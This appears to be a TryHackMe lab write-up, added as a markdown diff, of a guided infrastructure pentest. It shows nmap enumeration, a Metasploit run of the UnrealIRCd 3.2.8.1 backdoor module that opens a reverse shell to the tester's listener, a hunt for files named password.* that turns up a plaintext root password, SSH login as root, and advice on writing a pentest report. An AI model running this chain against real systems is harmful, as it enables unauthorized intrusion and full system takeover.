@@ -1,0 +1,245 @@
+#ROOM: Guided Pentest: Infrastructure
+#PATH: JR PENETRATION TESTER
+
+#OBJECTIVES
+
+1.Use tools and techniques to scan a linux host
+2.Research vulnerable software to find a working exploit
+3.Enumerate local linux files to escalate privileges
+
+#SCENARIO
+
+I've just landed ymy first junior role as a penetration tester. For my first engagement, im shadowing my team lead.
+
+It's Monday morning, and my project manager sends me an email and informs you that our biggest client, TryHatMe, recently deployed a new network device in their infrastructure. The devive needs testing
+
+============================================================================================================================
+ENUMERATION
+
+#Nmap scan
+
+run the command:
+nmap -sV -sC --min-rate 1000 -T4 -oA nmap-scan 10.49.179.83 -v -p-
+
+#results:
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 22:7c:77:c4:ac:d4:d2:6b:06:a5:6e:34:d6:19:05:31 (ECDSA)
+|_  256 b5:64:7d:66:2a:65:33:d5:fd:40:eb:0c:fe:3e:34:d7 (ED25519)
+6667/tcp  open     irc     UnrealIRCd
+| irc-info: 
+|   server: irc.pentest-target.thm
+|   users: 1
+|   servers: 1
+|   lusers: 1
+|   lservers: 0
+|   version: Unreal3.2.8.1. irc.pentest-target.thm 
+|   uptime: 0 days, 0:06:05
+|   source ident: nmap
+|   source host: ip-192-168-200-191.ap-south-1.compute.internal
+|_  error: Closing Link: krnicccgn[ip-192-168-200-191.ap-south-1.compute.internal] (Quit: krnicccgn)
+
+So two ports open: 22 for ssh and 6667 for irc
+
+============================================================================================================================
+VULNERABILITY ANALYSIS
+
+#questions time :Is ssh or irc version outdated? Is there a known exploit for any of them,or could there be? could something be misconfigured or perhaps it is?
+
+#using searchsploit
+
+no known exploit for openSSH 9.6p1
+However got a hit for Unreal3.2.8.1
+
+──(prince㉿VhagarT3rminal)-[~/TryHackMe/Guided-Pentest:INFRA]
+└─$ searchsploit UnrealIRC 
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                       |  Path
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                         | linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                              | windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                       | linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Service                                                                                            | windows/dos/27407.pl
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+##UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                         | linux/remote/16922.rb
+seemed more interesting
+
+============================================================================================================================
+INITIAL ACCESS
+
+Time to get in for the first time
+
+#Gaining initial foothold
+
+using metasploit frame accessed via msfconsole
+
+fired up metasploit: run msfconsole
+
+#in metasploit
+
+msf > search unrealircd
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+msf > use 0
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+
+finished setting all the options including the payload and it all loked like this:
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.200.191
+LHOST => 192.168.200.191
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
+   RHOSTS   10.49.179.83     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    6667             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.200.191  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+hit run and:
+
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+[*] Started reverse TCP double handler on 192.168.200.191:4444 
+[*] 10.49.179.83:6667 - Connected to 10.49.179.83:6667...
+    :irc.pentest-target.thm NOTICE AUTH :*** Looking up your hostname...
+[*] 10.49.179.83:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 4APJqI0tt2OZV9S7;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "4APJqI0tt2OZV9S7\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.200.191:4444 -> 10.49.179.83:39842) at 2026-05-23 14:10:24 +0200
+
+id
+uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)
+
+got the flag from /home/webmaster/flag.txt.
+
+============================================================================================================================
+POST EXPLOITATION
+
+#priviledge escalation
+
+##privesc vectors enum
+run command: find / -type file -name password.* 2>/dev/null 
+
+/boot/grub/i386-pc/password.mod
+/boot/grub/i386-pc/password_pbkdf2.mod
+/snap/core20/2379/var/lib/pam/password
+/snap/core/17272/usr/lib/pppd/2.4.7/passwordfd.so
+/snap/core/17272/var/cache/debconf/passwords.dat
+/snap/core/17272/var/lib/pam/password
+/snap/core18/2999/var/lib/pam/password
+/snap/core18/1885/var/lib/pam/password
+/snap/core22/1621/var/lib/pam/password
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/etc/password.txt
+/var/lib/pam/password
+/var/cache/debconf/passwords.dat
+
+/etc/password.txt lookes interesing 
+
+cat /etc/password.txt
+
+heyyy, what do you know, found em credentials in plain text haha
+
+cat /etc/password.txt
+root:PDLrCVl1pLD91U0JMmCz
+
+log in via ssh
+
+credentials worked
+
+Last login: Thu Jan  1 00:00:10 1970
+root@pentest-target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@pentest-target:~# pwd
+/root
+root@pentest-target:~# ls -al
+total 40
+drwx------  6 root root 4096 May 23 12:25 .
+drwxr-xr-x 22 root root 4096 May 23 10:38 ..
+-rw-------  1 root root    5 Feb 17 18:58 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 May 23 12:25 .cache
+drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4096 Oct 22  2024 .ssh
+-rw-r--r--  1 root root   20 Mar 13 10:18 flag.txt
+drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
+root@pentest-target:~# cat flag.txt
+THM{Escalat1on-D0ne}root@pentest-target:~# 
+
+============================================================================================================================
+REPORTING
+
+a pentest report must have the following:
+
+
+    1.A cover page with a title, your name, and email address, and version control.
+    2.A table of contents (Optional).
+    3.An executive summary, aimed at the manager who requested the engagement, explaining what was achieved in non-technical terms.
+    4.A technical summary aimed at the engineering manager, so they understand the impact and can prioritize accordingly (Optional).
+    5.A table of all vulnerabilities found, ordered by severity, aimed at managers and engineers, again to prioritize accordingly.
+    6.Detailed exploitation section, where each vulnerability and its impact are explained, exploitation steps and proof are shown, and recommendations for mitigations are given. This is aimed at engineers who will remediate your findings.
+    
+ #example reported finding for the privilege escalation vector found in this scenario.
+ 
+Title: Root Password Stored in Plaintext
+
+Severity: Critical
+
+Description: The root user's password was found stored in plaintext within the file /etc/password.txt. This file was readable by low-privileged users, allowing any user with shell access to retrieve the root credentials and fully compromise the system.
+
+Exploitation Steps:
+
+    Obtain a low-privileged shell on the target system.
+    Read the contents of /etc/password.txt using cat /etc/password.txt.
+    Use the discovered root password to escalate privileges via ssh root@IP.
+
+Recommendation: Remove the plaintext password file immediately and rotate the root password. Credentials should never be stored in plaintext on the filesystem. Implement a secrets management solution or use properly configured system authentication mechanisms (such as /etc/shadow with strong hashing). Additionally, enforce the principle of least privilege to restrict file access permissions.
+
+
+
+
